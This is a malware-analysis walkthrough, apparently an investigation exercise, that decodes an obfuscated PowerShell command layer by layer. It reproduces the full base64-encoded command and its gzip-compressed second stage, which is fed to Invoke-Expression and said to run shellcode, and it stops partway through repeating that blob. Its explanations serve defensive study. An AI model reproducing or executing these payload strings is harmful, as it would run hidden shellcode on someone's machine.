You find the following malicious PowerShell command during your investigation. What does it do? 

# Summary:
This code is obfuscated multiple times in various ways. it uses BASE64 3 times to hide the code in multiple nested layers of abstraction. ultimately it runs some shell code. Below is a step by step break down of what is going on. 


## Original Command: 
```cmd
%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEMAMgBKAHAAVwBVAEEALwA2AFYAWABhADQAKwBpAFMAQgBmACsAMwBQADQASwBQAG4AUwBpAFIAcgB1ADkAWAA3AHIAZgBUAEQASwBBAGkAawBoAGoAbwAzAGoAQgA3AHUAMQAwAG8AQwBnAEYAQgBRAHEAaABVAEgARgAzAC8AdgBzAGUAUQBIAHQANwAzAHAAbgBKAFQAcgBJAG0AeABLAHEAaQB6AHUAMgBwADUANQB3ADYAcQBKAGoAZQBxAFQAUwB3AEUAWgBXAEoAaQBaAG0ANwBCAFEANQBDAG0AMwBoAE0AUABaAGUANwA3AFIARwBSAE0AbAArAFkAcgAvAG4AYwBPAHYASQBRAFQAWgBhAFQAdwBmAHMARwAwADMAYwAvAEkATwBoAGQATgA4ADAAQQBoAHkASAB6AFoAKwA1AEcAMABRAFAAZABaAFEAcQAzAEIAegAxADQAZAA0AGsAWgBPAGIAagBNAHAASgBOAGsASQB6AGEAagBBAEIAZAB2AGIAbgBJADMANgBWAEwAawBoAGYAbwBhAHYAMwBzADYAdABRAC8ANAAzAGMAWABVAEkAbQBZAEkAaABnAHEAdgByAE8ALwAzAGkASwB2AGIAMwB0AHYAagBJAHgAOABGAEEAZgBaAG8ATgByADgAWABNAEcAWABEAEUATAB1AEcAWQArAE8AdwBVAEcAVAArAFkAcABZAFcARAB2AEQAZABzADcASABGAGkARABKAC8ATQByAGYAdgA5ADQASgBEAEQATgAyADUAYgBJAHQANQBIAFYAawBRAEUATwB1AFoAeQBiAHMAbgBnAHMAQQBjADgAZQA1AFYAMwA3AEYAcABJAGYALwBIAEgALwBuAGkANgAxADMAdAA3AGIANgAvAGoAMwBRAG4ATABPAFQAVgBPAEsAVABZAHYAVABjAGQASgAxADkAawB2AGgAVQBUAGcANwBQAFkAeAA0AFcAOABiAEsATwBBAGgARwBSAE4ANwA1AGUAMgAxADYAagBmAHoAMQBQAHYAeAA2AG4AegBjAHUAWgA3AHYAbgBpAEoAYgBPAFAAcgBFAE0AZQB2AGcAMAB5ADAAWgBqAEsARgBQAEEAdwBWAHcASQBiAE4ATQBNAHkAWABtAGQAZgBFADMAdQB2AGIARwAvAFAAMQB3ADUAdABwADUARgBIAGIAeABmAGUAaQBSADMARgBBAGYAQgBVAEgAQgB4AHYAaAA4AEgANgBvAGUANgBhAEQAcAAzAGcATgBZAHYAawBRAGoAcwAvAGIANQBJAHYAZwBSAEkAQgBwAEYASABpAFoAQQArAEEATAB5AEIAMwBJAEQAaABkAHUAdgBjAGgAeAB5AHEARAAzADkAWABmADEAdgBoAFgARwArAEgAZwBGADkAMwBlAEYAQwBwACsARgBZAEoAZABDAGcAMgBMADUAdwBvAG4AZgBnAFEATQBZAEMATAB6AEoAMQBFAEUANABQADMAagAvAGkAVgB4AEYAKwBQADEAQQBzAEcATAB1AFcAKwA0AG4AVgBEAFcAeABnAHoAYwA2AHgAZQA4AFUAOABQADMARQAxAGQAegBOAHoAVwBzADYAeABCAEIAUABRAFMARwBoAG4AYwBwADkAWQBhAHAAbABSAGcAWQBuAGQARQBxAEMATwBEAG4ATwBXAFIARABoADQAdABzAC8ANQA1AE8AWgB2AFUAcQBHADUAVgA4AHEAcQBsADIAbABMAGoATABaADgAVwBSACsAZgBHAEYAZQBGADgAUQAyADMAMwBJADMAeABkAHkARgBQAGMAbgA2AHUAeABIAFoAagBvAG0ARAA1AFAAMgB2AHMANgBHAEgAMQA3AGEASABlADcARwBuAHUAegBhADYARQB2ADQANwArAEsAOQBuAGgAdABjAE8AVABCAFAAaQBYADcAZQBOAHcAYwA5AEMALwB2AEkAQwBtADcAMABMAE8AZwBBADQAVQBQAEIASABzAGIANQByADAAdwA5AFoATABuAE8ATwBSAFgARAB1AEkAWABnAEYAbABDAGgAKwA3ADAAeAAyAGgAbwBXADgANgBNAG4AWQBCAGYAeQB5AE8AZABEADAAZABnADEAcABoAHEAKwA3AEwANgBrAFYAWAA2ADAAbgA4ADQAVABMAHYASwBPAEgAWQBaAGwAUgBJAHMAaAB6AFYARwBaAFUAcgBEAHYAWQBMAEQATwBzAEYAOQBxAFgAVgAyAHgARQBTAFQAcABNAE0AdQBiAGkAcgBoAHcANQAxAEUAWgA2AFMASwAvAHEAMwBxADQASgArAFIAbgBTAGkAMgBtAGUAZQBKAEEAeABFAFkATABUAEIAUgBoAG0AcQBvACsAUgByAFQAcwBKAEsAbQBWAG0AYQBKAHUAWQBpADEAVgA3AGMAMwBYAGgAawA1AEYAUABtAFAAQwA2ADQAMABEAEsAZwBhAFkARABuAEEAbQBzAEoARgBpAG8ATgBPAEYATQBBAE4ANwArAEgAegArAEsAOQAxAEIAawBSAGQAZAAzAHMAQQB1ADcAMAB5AG8AMABjAFAAUQBOADEASgB4AEwAUgBxAFYAMAAwAHoAZgBZAC8ASwBnAGoAUAAzAEgANwBtAGkAZABaAFUAaQBSAFkAWABVAEgANgA1AEQAUQBRAFEASABVAEkATABUAE0ATABPADYAQgBRADEAeABMAGMALwA0ADkANAAvADgAMgA5ADcAMAB2AE0AZAAyADcAeQBBAGIANABjAFoAQwBGAE4AeABGAGMAdQBwAGsAbQA2AHAARAB0AFIAYwByAGsAQQBwAFMAOQBZAHAAcwBnAEYARgBGAEEAYgBCAE0AVABsADkAQgBDADMAbQA4AGsAdAA1AEcAMABLACsAVwAzAHIAMABFAGEATgA4AGIAbABmADIAUwA4AG4AKwA3ADUAVwA0AGcAYwA5AGUAQwByAHcAZQBDAFYAMgBZAEsAegBsAFMAVwBzAHgAbAArAFIASgBvAEsAeABuAEoAMQBGAEIAaQA0AGQAWgBHAEoAeABLAEsARgBDAG4AbQA3AGkALwBnADMAMwBiAFUAbQArAGcAbwBMADMAUwBsAEkAKwBIAGUAbgBoAEUATABiAFMAWABZAFkAMABHAEoAWgA3AE8AMABKADYAZgB6AE0ANQBCAGMAMQBxAHgAWQB2ACsAaQBKADUATwBmAFAAdQAyAE8AKwBoAEMAeAA3AFMAZQBWAGIAVwBtAGMAMwAwAC8AMgBhADIAagBQAEwAawByAEQAYgBoAFAARwBCADcAVAB2AE4AVQAyAFEASQB4AFgAUwBXAE4AUQBRAGsAVABoAHgATAA2AG0AUwB2AEkAdgBEAFUARgBwAGIAbABxAHYATQBJACsARgBVAFgAWABJAE4AMgBlAEEANABZAGcAbwAyAE0AcABUAGoAZABHAEcASwBzAGUAdABDAFQAQgBBAFgAdgArAFUAbgB1AHgARQA4AFEAbgBYAG4AOABGAFMAVgBmAFQALwBRAGsAbgBpAGwAdgB0AFEAVwBiAGYARQBGADgAYQBJAHQAZABLADAAWQBOAGUAUwBOAGUAQQBwADMAcABTAGkAdQBiAGEAWABWADEAagAwADgAZwBMAHgATQBBAEIATgBMAGEASQB5ADUAcwBJAEkAcwBVAGUAMQB2AFIARgBVADIAWABQADcARgBWAE0ARgBHAEsAZABDAE8ASQBTADgAYgAzAFMAcAAzAFIAcABYADkAVABOAEQAUQBWAGwAZwBlAEgAZQBHADQAcQBuAFgAVwBTADkAbQAzAFQANgBsADkAWQBYAFgAYwBqAEsAYQBRAC8AYwB0AFEAMwBFAHAARwBQAFcAeQBjAEcANQBFADIATwBxAE8AcQBKAEQAKwBRACsAZABDAHMANwBDAFYAMwBTAEkAeQA2AG8AVQArAGYAUwBLAEoAWABOAE0AYQBPAFMAQwBjAHcAbgBwAEQAagBUAHQAQQBtADkAZwBqAHMAbgBuAGgAMQBoAHMASAB1AGUAVABoAEcARQBJAE4ARQAyAFoAZQBxAEYARAAvAHIAdgBCAGoATAAyADcANABrAHUAOQBFAEkANABuAGoAVwBJAHcAOQAwAHQAMABLADAAaABYAFcAdAB0AC8ASgBIADMATwBJAHMAYwBLAGYAbQBhAEcAegBOAHUALwBMAFQAcwBGAHAAWgArAHEAWAA2AHMAMwBZADYAYgByAEcARgBEADgAdgA5ADUASwBCAEcAVQBkAGcANgBVADQARgBZAEIAOAB2AGQAOQArAFQAdABLAE8AVABjADQAVwBvAHgANwBHADYARQBxAEMAVwBYADYAdQB4AFQAeAAxAGMAYQBoADgATwBvAFcAagBKADcAMwBhAEQAYgA0AG4AWQBIAFMALwBKAGEAdgBFAEYAcQArAGcAbgBQAEsANQByAHMAcwB0AHkASwAwADcAYgBpAGYARwBCAFYAaAArAHAAQwBMAGcAMwBaAG4AVAA0ADgAZABWAFcAdAAvADIASgBPAGEAbQBPAGoAegB4ADAAeABlAHgASwBIAGcAdABWAGYARAAzAGIAVwBUAEwASABaADkAdABnAFoAUwA5AHAAOABMAE0ANwBqAGkAVAA2AGMASQBzAFMAeAAzAEUAeABSAHoAZABsADAAVQBlAFAAVgBnAGUAeQB4AFUANgBJAGwAKwBsAEkAZABWAFcAcwBtAHoANAA3AHQAOABjADQAWAB4AFIAaQBkAHgASQBWAGYAdwB0AG8AegA0AGMATABEAFEAbABEAGEAMwBLAHIAeQBJAG4AWQA1ADcAVQBqAEYANQA3ADMAUQBkAEcAYQBEAFIAcgB0AGkAZABiAHEAMQBTAEkAMgBrAEoAKwBRAHMAeQBVAE8ALwBIAGMAOABQADQANwA0ADQAMQBsADQAbQA2AC8AbQBxAHEAYQAyADEANgBYADYAdAAxAGwAbgBOAEoAcQB2AFIAdwA4AGkAUgBtAG4AYQBuAG8AbgBKAEIANgB5AFYAYwA5AEIAcwBlAE0ATgB4ADIAeABxAEgAaABWADgAegB1AFkAdgBNAGkAYQB0AE8AVwBpAG8AVABGAFQAZwB5AFEASgB1AG4AagBRADIAZQB5AE0AKwBYAG0AcwBzAFAAdgBhAHQAaQBlAE8AaQAzAFAAZABvAHgAcAA3AGUARABiAHQARwBhAFkAaABxAFUANABMACsAMQBwAG8ANgA1ADAAZAByAE8AYQB0AEQAeAB5AG4AZQBsADYAaABzACsAbQBXADcAVQBFACsANQBrAGIAcQArAG8AVABVAGwAMQB1AE0AeABCAEUAWgBlAGEAVAAzAGwAUABvAGIAWgBVAGwAUABqAC8AMABqAEYASABGADYATwA4ADYAVQBBADUAaQBhAGQARgBaAGQAcQBaAE4AKwBTAEEAagBqAGkAeABxAFIAegByAFoAQgB0AEsAcQBaAGkAeQAxADAAZgA2AEkARABhAEcAaQBkAEMAVABuAHAAVABmAHEAeABlADAASgBHADkAVgBGAEwAcAB6AGIAKwArAE8AegBXAEEAcABPAHIAZABuAG8ATABEAFEAVgBvAGEAbwBDAEYANgAzAGQARwBYAGkAOABCAFUANABiADgASgB4AFIAUABEAEcAawBCADcAUgB4AGcARwBOAE4AMgBVADkAeQA1AFkAegAyAHgAQgBhAFYALwBYAHoARQAwAGYATQBjADUAaQBJAC8ATgAxAFoAWQBhACsAOQBXAHMAZgBzAFEAeQBFAE8ANgB0AHEAbwBvADYARQBHAE8ANgAwAHUAcAB3AHgAcwBsADAAcABhADMAWABGADgAZAAxAEsAcAA0AHkASwBFAGwAZQAxAHkAeABRAHEAMgBxAEQANABkAHAANwBoADIAVABDAHIAWQBtAEEAZgBRAGsAcAArAFMAZQAvAHgAOABEAC8AMwBjAE8AegBhAHAAWgBVAHEATwBnAE0AawBIAFIAUwA5AFoATABwAFcATABTAEsAMwB5ADgAZQBiADAAOQB2AFYAMQA3AHUANAAvADUAbgBYAEUAQwBiAGIAVgBhAEsAeQBsADQANgBhAHQARAAwAGcARAArAFcANQBzAGwANgAwAEYAbwA2AFEANgBVAFAAKwBoADYAcgBuAGYAVwBnAEEAUwBEAFMAKwArAGkARQBEAHUAUgBLAEIAUgArADMAbQA3AHYAYwBPAEIAaABCADEAcABSAGEARgBhAHYAbABaADUAMQBIAEkASwBTAGIAdQBzAFgAYgBRAC8AMABmAGwAbABIADkAZwBZADMAMgBoAHkARwBqAGYAcABQAFIAMABYAG8AdwBpADgAYgBvAGMAWABLAFkAagBLAGkAOQBUAHIAdABTAEMANABSAFgAaAB1AHoANgA4AGIASAB4AHgAYwBJADcAMwBLAHgAcABDAGcAKwBZAFcAOQBEAHIAVABKAFQAUABUAFcAcQBWAFcAaQBuAHEAcQBkAG0AdABaAGoANwBmAFYAaAA0ADQAcwBkAFoAdQA1AGUAbwBBAC8AbQBMADgAcwB5AFQAegA1AGEAYwAxAEIASQBjAGEAMwBiAFAAUgBaADcANwArAFoANwA1AHIAdwBmAHcAbgBkAEYALwBoAHoAWQBCAEwAMgAzAHEAUABxAEIATABIAGYAbwA1AFgAcwBWAGMALwBtAHMAdQBKADYANwAvAEEAZgB6AHgATQBiAFQAUAA4AE0AbQBDADkAMAB3ADMASgBWADkASQA5AFkARABlAGIAWQBrAEIAMwB6AGYAcABoAFYAMgA0ADEAWQB1AE0AMgBOAGUAWQBXADUAMwA1AHgAdAB4AEIAZQBHAHoAWQBxAE0ATgBIAFQAcgBDAEoAawB0AHUAYgB5AGIANwBaAC8AbQBLAE8AdQBwADAASgAvAHMAVgBNAE0AYwBMAFEAYwA5ACsATgBpAEEARQBzAHgAZABDAEUASgBhAHAAVABKAGMAbgBtADMATABmAGMAMwB3AG8ANAB0AFMANABFAEQAZwBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=
```

### Break Down 1:
```cmd
%COMSPEC% /b /c start /b /min powershell
```
1. %comspec% - is an old way to call cmd.exe and used for obfuscation from alerting on cmd.exe
2. /b: no window
3. /c: run single command and exit
4. /b: no window
5. /min: minized window (shouldn't be used since /b option is used)
6. powershell: open powershell and run the rest of the arguements in powershell
7. -nop: do not load the powershell profile
8. -w: window style 
9. hidden: window will be hidden from view
10. -encodedcommand: identifies that the follwoing is base64 and should be decoded before sending it to powershell for interpretation

### BASE64 (1):
base64 code is easily decoded using cyberchef with the options "from base64" and "remove Null"

this will clean the code up and return:
```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

### Break Down 2:
1. $s= : declare a variable 
2. New-Object: Create an instance of a .Net or COM object. This allows you to startup and control other applications
3. IO.MemoryStream: convert the follwoing into data that can be read by the sytem and used
4. [Convert]::FromBase64String: convert the contents of the parenthesis and quotes from Base64 to IO stream (Binary)
5. BASE64 (2): base64 code is easily decoded using cyberchef with the options "from base64" no other options needed
```
-¥eÿ¥Wk¢HþÜþ
>t¢F»½_ºßL2Hc£xÁîít (
¡Pqwþû@{{ÞÉN²&Äª¢Îí©ç:¨Þ©4°»BxL=»í2_¯ùÜ:òMÁûÓw? è]7Í!ógîFÑÝe
·=xw9¸Ì¤d#6£onr7éRäú¿{:µøÝÅÔ"f
¯¬ï÷«ÛÞÛã#öh6¿0eÃ»cã°PdþbðÝ³±Å22·ï÷CÝ¹lyYëÉ»'ÀñîUß±i!ÿÇùâë]íí¾¿t',äÕ8¤Ø½7'_d¾³ØÇ¼l£dMï¶×¨ßÏSïÇ©óræ{¾xlãëÇ¯L´f2<ÀÍ0Ì×ÄÞëÛóõÃiäQÛÅ÷¢Gq@|áð~¨{¦§x
bùÏÛäàDixàÈÈn½ÈqÊ ÷õwõ¾Æøx÷w
`BbùÂß¼ÉÔA8?xÿ\Eøý@°bî[î'T5±7:ÅïðýÄÕÜÍÍk:ÄOA!¡Ê}aªeF'tJ89ÎYáâÛ?ç½Jå_*ª]¥.2Ùñd~|a^Ä6ßr7ÅÜ=Éú»Ùäý¯³¡×¶{±§»6ºþ;ø¯g×Lâ_·ÁÏBþò½:8PðG±¾kÓY.sEpî!x(~ïLv¼èÉØü²9Ðôv
i¯»/©_­'óË¼£aQ"ÈsTfT¬;Ø,3¬ÚWlDI:L2æâ®9ÔFzH¯êÞ®	ùÒix1Ófª­;	*efhU{suáOðºã@Ê¦	¬$X¨4áLÞþ?÷PdE×w°»Ó*4pô
ÔKF¥tÓ7Øü¨#?qû'YR$X]Aúä4@u-3; P×ÜÿxÿÍ½ïKÌwnò¾d!MÄW.¦Iº¤;Qr¹¥/X¦ÈPÄåô·É-äm
ùmëÐFñ¹_Ù/'û¾Vâ=x*ðx%v`¬åIk1äI ¬g'QAYJ(P§¸¿}ÛRo  ½ÒzxD-´a%ÎÐÌÎAsZ±bÿ¢'>íú±í'mißOökhÏ.JÃnÆ´ï5M#ÒXÔ8q/©¼ÃPZ[«Ì#áT]r
Ùà8b
62ãta±ëBL¿å'»<BuçðT}?Ðx¥¾Ômññ¢-t­5äx
w¥(®m¥ÕÖ=<¼LKh¹°,QíoDU6\þÅTÁF)Ð!/Ý*wFýLÐÐVXá¸ªuÖKÙ·O©}auÜ¦ýËPÜJF=l6:£ª$?ùÐ¬ì%wHº¡OH¢W4ÆH'0ãNÐ&öìxuÁîy8FDÙª?ë¼ËÛ¾$»ÑâxÖ#t·B´u­·òGÜâ,p§æhlÍ»òÓ°ZYú¥ú³v:n±Ëýä FQØ:SXËÝ÷äí(äÜáj1ìn¨%êìSÇWÃ¨Z2{Ý ÛâvKòZ¼Ajú	Ï+ì²ÜÓ¶â|`UêB.
Ù><uU­ÿbNjc£Ï1{Õ_vÖL±ÙöØKÚ|,Îã>"Ä±ÜLQÍÙtQãÕì±S¢%úRUk&ÏíñÎÅÄ_ÂÚ3áÂÃBPÚÜªò"v9íHÅç½ÐtfF»buºµH¤'ä,ÉC¿Ïã¾8Ö^&ëùª©­µé~­ÖYÍ&«ÑÃÈv§¢rAë%\ô0ÜvÆ¡áWÌîbó"jÓÅN&éãCg²3åæ²ÃïjØ:-ÏviíàÛ´f¥8/íi£®tv³´<rézÏ¦[µû«êR]n3DeæÞSèm%>?ôQÅèï:PbiÑYv¦Mù #,jG:ÙÒªf,µÑþ
¡¢t$ç¥7êÅí	ÕE.Ûûã³X
N­Ùè,4¡ª­Ýx¼NðQ<1¤´qcMÙOråöÄý|ÄÑóæ"?7VXkïV±ûÈCº¶ª(èAëK©Ã%Ò·\_ÔªxÈ¡%{\±B­ªiî
¶&ô$§äÿÿwÍªYR£ 2AÑKÖK¥bÒ+|¼y½=½]{»ùqmµZ+)xé«CÒþ[%ëAhé?èz®wÖKï¢;(~ÞnïpàaZQhV¯unëmô~YGö7ÚúOGEèÂ/¡ÅÊb2¢õ:íH.^³ëÆÇÇïr±¤(>aoC­2S=5ªUh§ª§fµû}XxâÇY»¨ùòÌÏÔkvÏEûùù¯ðÑ6/mê> Kú9^Å\þk.'®ÿüñ1´ÏðÉ÷L7%_HõÞmß7é]¸ÕØ×[ùÆÜAxlØ¨ÃGN°ÛÉ¾Ùþbº	þÅL1ÂÐsß,ÅÐ%ªS%ÉæÜ·Üß
8µ.
```
This is some binary data which makes more sense when you see below that it is a compressed using gzip.  

6. IEX: Invoke-expression evaluates or runs powershell code
7. New-Object IO.StreamReader: reads the stream of data created earlier 
8. New-Object IO.Compression.GzipStream: interprets the incoming as a gzip file 
9. $s: use the $s variable declared earlier
10. [IO.Compression.CompressionMode]::Decompress: decompress the gzip 
11. .ReadToEnd(); Reads all characters from the current position to the end of the stream before interpreting. 


## Further Down the Rabbit Hole:
```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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